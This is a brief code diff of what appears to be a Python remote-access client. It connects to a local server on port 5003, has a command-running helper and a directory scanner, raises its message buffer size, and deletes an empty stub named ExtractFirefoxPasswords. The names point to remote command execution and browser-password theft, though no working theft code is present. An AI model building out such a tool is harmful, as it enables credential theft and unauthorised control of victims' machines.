@@ -10,7 +10,7 @@ GlobalOverwriteOutput = None
 
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 5003
-BUFFER_SIZE = 1024 * 1024 # 128KB max size of messages, feel free to increase
+BUFFER_SIZE = 4 * 1024 * 1024 # 4mb max size of messages, feel free to increase
 SEPARATOR = "<sep>"
 def RunCommand(command):
     # Should be error prove command running function
@@ -77,13 +77,7 @@ def RecursiveScan(directory, max_depth, current_depth=0):
     return items
 
 
-def ExtractFirefoxPasswords():
-    try:
-        print("Extracting Firefox Passwords...")
 
-
-    except Exception as e:
-        print(f"Error occurred: {e}")
 
 def EstablishConnection():
     global GlobalOverwriteOutput
